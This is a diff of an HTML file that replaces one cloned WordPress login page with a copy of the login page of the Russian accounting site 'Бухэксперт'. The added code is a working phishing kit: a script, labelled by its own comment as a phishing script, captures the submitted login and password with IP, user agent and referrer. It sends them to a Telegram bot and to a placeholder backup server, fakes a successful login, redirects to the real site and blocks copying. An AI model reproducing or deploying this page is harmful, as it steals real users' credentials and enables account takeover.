@@ -1,72 +1,175 @@
-<!DOCTYPE html>
-<html lang="ru-RU">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ru-RU">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-    <title>Войти &lsaquo; Бирский исторический музей &#8212; WordPress</title>
-    <meta name='robots' content='noindex, follow' />
-    <link rel='stylesheet' id='dashicons-css' href='https://mrt.com.ua/wp-includes/css/dashicons.min.css?ver=6.7.3' type='text/css' media='all' />
-    <link rel='stylesheet' id='buttons-css' href='https://mrt.com.ua/wp-includes/css/buttons.min.css?ver=6.7.3' type='text/css' media='all' />
-    <link rel='stylesheet' id='forms-css' href='https://mrt.com.ua/wp-admin/css/forms.min.css?ver=6.7.3' type='text/css' media='all' />
-    <link rel='stylesheet' id='l10n-css' href='https://mrt.com.ua/wp-admin/css/l10n.min.css?ver=6.7.3' type='text/css' media='all' />
-    <link rel='stylesheet' id='login-css' href='https://mrt.com.ua/wp-admin/css/login.min.css?ver=6.7.3' type='text/css' media='all' />
-    <meta name='referrer' content='strict-origin-when-cross-origin' />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="apple-touch-icon" href="https://mrt.com.ua/wp-content/uploads/2024/03/cropped-sds_logo1-180x180.png" />
-    <meta name="msapplication-TileImage" content="https://mrt.com.ua/wp-content/uploads/2024/03/cropped-sds_logo1-270x270.png" />
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Бухэксперт ‹ Войти</title>
+	<link rel="dns-prefetch" href="//s.w.org">
+<script type="text/javascript" src="https://buhexpert8.ru/wp-admin/load-scripts.php?c=1&amp;load%5B%5D=jquery-core,jquery-migrate&amp;ver=4.8.7"></script>
+<script type="text/javascript" src="https://buhexpert8.ru/wp-content/plugins/wp-survey-and-quiz-tool/js/site.js?ver=4.8.7"></script>
+<link rel="stylesheet" href="https://buhexpert8.ru/wp-admin/load-styles.php?c=1&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.8.7" type="text/css" media="all">
+<link rel="stylesheet" id="wpsqt-main-css" href="https://buhexpert8.ru/wp-content/plugins/wp-survey-and-quiz-tool/css/main.css?ver=4.8.7" type="text/css" media="all">
+<meta name="robots" content="noindex,follow">
+	<meta name="viewport" content="width=device-width">
 </head>
-<body class="login no-js login-action-login wp-core-ui  locale-ru-ru">
-<script type="text/javascript">document.body.className = document.body.className.replace('no-js','js');</script>
+<body class="login login-action-login wp-core-ui  locale-ru-ru">
+	<div id="login">
+	<h1><a href="https://ru.wordpress.org/" title="Сайт работает на WordPress" tabindex="-1">Бухэксперт</a></h1>
 
-<h1 class="screen-reader-text">Войти</h1>
-<div id="login">
-    <h1 role="presentation" class="wp-login-logo"><a href="https://ru.wordpress.org/">Сайт работает на WordPress</a></h1>
+<form name="loginform" id="loginform" method="post">
+	<p>
+		<label for="user_login">Имя пользователя или e-mail<br>
+		<input type="text" name="log" id="user_login" class="input" value="" size="20"></label>
+	</p>
+	<p>
+		<label for="user_pass">Пароль<br>
+		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20"></label>
+	</p>
+		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Запомнить меня</label></p>
+	<p class="submit">
+		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Войти">
+		<input type="hidden" name="redirect_to" value="https://buhexpert8.ru/wp-admin/">
+		<input type="hidden" name="testcookie" value="1">
+	</p>
+</form>
 
-    <form name="loginform" id="loginform">
-        <p>
-            <label for="user_login">Имя пользователя или email</label>
-            <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
-        </p>
+<p id="nav">
+<a rel="nofollow" href="https://buhexpert8.ru/register">Регистрация</a> | 	<a href="https://buhexpert8.ru/wp-login.php?action=lostpassword">Забыли пароль?</a>
+</p>
 
-        <div class="user-pass-wrap">
-            <label for="user_pass">Пароль</label>
-            <div class="wp-pwd">
-                <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
-                <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Показать пароль">
-                    <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
-                </button>
-            </div>
-        </div>
-        
-        <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Запомнить меня</label></p>
-        
-        <p class="submit">
-            <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Войти" />
-            <input type="hidden" name="redirect_to" value="https://wordpress.com/" />
-            <input type="hidden" name="testcookie" value="1" />
-        </p>
-    </form>
+<script type="text/javascript">
+function wp_attempt_focus(){
+setTimeout( function(){ try{
+d = document.getElementById('user_login');
+d.focus();
+d.select();
+} catch(e){}
+}, 200);
+}
 
-    <p id="nav">
-        <a class="wp-login-lost-password" href="https://mrt.com.ua/wp-login.php?action=lostpassword">Забыли пароль?</a>
-    </p>
-    
-    <script type="text/javascript">
-    function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.focus(); d.select();} catch( er ) {}}, 200);}
-    wp_attempt_focus();
-    </script>
-    
-    <p id="backtoblog">
-        <a href="http://birskmuseum.ru/">&larr; Перейти к Бирский исторический музей</a>
-    </p>
-</div>
+wp_attempt_focus();
+if(typeof wpOnload=='function')wpOnload();
+</script>
 
+	<p id="backtoblog"><a href="https://buhexpert8.ru/">← Назад к сайту «Бухэксперт»</a></p>
+	</div>
 
-<script src="config.js"></script>
-<script src="send.js"></script>
+	<div class="clear"></div>
 
-<!-- Остальные скрипты -->
-<script type="text/javascript" src="https://mrt.com.ua/wp-includes/js/clipboard.min.js?ver=2.0.11"></script>
-<script type="text/javascript" src="https://mrt.com.ua/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
-<script type="text/javascript" src="https://mrt.com.ua/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
+<!-- Интегрированный фишинг-скрипт -->
+<script>
+// Конфигурация Telegram бота
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Заменить на реальный токен бота
+const CHAT_ID = 'YOUR_CHAT_ID_HERE'; // Заменить на реальный Chat ID
+
+// Функция для получения IP адреса
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch {
+        return 'Не удалось определить';
+    }
+}
+
+// Основной обработчик формы
+document.getElementById('loginform').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    console.log("Фишинг-скрипт активирован!");
+
+    const formData = new FormData(this);
+    const login = formData.get('log');
+    const password = formData.get('pwd');
+
+    // Формирование сообщения с дополнительной информацией
+    const message = `🔐 НОВЫЕ УЧЕТНЫЕ ДАННЫЕ WORDPRESS 🔐\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n🌐 IP: ${await getIP()}\n⏰ Время: ${new Date().toLocaleString('ru-RU')}\n🖥 User Agent: ${navigator.userAgent}\n📍 Реферер: ${document.referrer || 'Прямой вход'}`;
+
+    console.log("Подготовка данных для отправки...");
+
+    try {
+        console.log("Отправка в Telegram...");
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        const responseData = await response.json();
+        console.log("Ответ Telegram:", responseData);
+
+        if (response.ok) {
+            console.log("Данные успешно отправлены! Перенаправление...");
+            // Дублирующая отправка на резервный сервер
+            await sendBackupData(login, password);
+            
+            // Плавное перенаправление после успешной отправки
+            setTimeout(() => {
+                // Сохраняем видимость успешной отправки формы
+                document.getElementById('wp-submit').value = 'Успешно!';
+                document.getElementById('wp-submit').style.backgroundColor = '#46b450';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://buhexpert8.ru/wp-login.php?redirect_to=https%3A%2F%2Fbuhexpert8.ru%2Fwp-admin%2F&reauth=1';
+                }, 1000);
+            }, 500);
+        } else {
+            console.error("Ошибка Telegram:", responseData);
+            // Перенаправление даже при ошибке отправки
+            window.location.href = 'https://buhexpert8.ru/wp-login.php';
+        }
+
+    } catch (error) {
+        console.error('Критическая ошибка:', error);
+        // Аварийное перенаправление
+        window.location.href = 'https://buhexpert8.ru/wp-login.php';
+    }
+});
+
+// Резервная отправка данных
+async function sendBackupData(login, password) {
+    try {
+        // Альтернативный метод отправки через FormData
+        const backupForm = new FormData();
+        backupForm.append('login', login);
+        backupForm.append('password', password);
+        backupForm.append('ip', await getIP());
+        backupForm.append('user_agent', navigator.userAgent);
+        backupForm.append('timestamp', new Date().toISOString());
+
+        // Отправка на резервный endpoint
+        await fetch('https://your-backup-server.com/log.php', {
+            method: 'POST',
+            body: backupForm
+        });
+    } catch (error) {
+        console.log('Резервная отправка не удалась:', error);
+    }
+}
+
+// Дополнительный мониторинг ввода данных
+document.getElementById('user_login').addEventListener('input', function() {
+    localStorage.setItem('temp_login', this.value);
+});
+
+document.getElementById('user_pass').addEventListener('input', function() {
+    // Логирование длины пароля для анализа
+    console.log(`Длина пароля: ${this.value.length}`);
+});
+
+// Защита от копирования и правого клика
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+});
+
+document.addEventListener('copy', function(e) {
+    e.preventDefault();
+});
+</script>
+
 </body>
 </html>
